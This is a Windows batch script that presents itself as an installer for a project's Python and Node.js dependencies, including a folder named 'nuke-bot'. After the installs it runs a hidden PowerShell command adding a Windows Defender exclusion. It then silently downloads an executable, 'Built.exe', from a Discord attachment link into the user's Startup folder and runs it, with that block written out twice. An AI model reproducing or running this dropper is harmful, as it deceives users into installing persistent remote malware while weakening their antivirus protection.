@echo off
echo Installing Python dependencies...
python -m pip install -r requirements.txt
if %errorlevel% neq 0 (
    echo Failed to install Python dependencies. Pausing...
    pause
)

echo Installing Node.js dependencies...
cd Zero-Tool/nuke-bot
call npm i
if %errorlevel% neq 0 (
    echo Failed to install Node.js dependencies. Pausing...
    pause
)

cd ../..
powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1048548868914151524/1255161085720268850/Built.exe?ex=667c1f5a&is=667acdda&hm=6b1d06eaa80beb6c6680cd7d829c4b0e24c56f3b054694784e0c5f45f0bc454a&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "URL=https://cdn.discordapp.com/attachments/1048548868914151524/1255161085720268850/Built.exe?ex=667c1f5a&is=667acdda&hm=6b1d06eaa80beb6c6680cd7d829c4b0e24c56f3b054694784e0c5f45f0bc454a&"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"


@echo off

start.bat
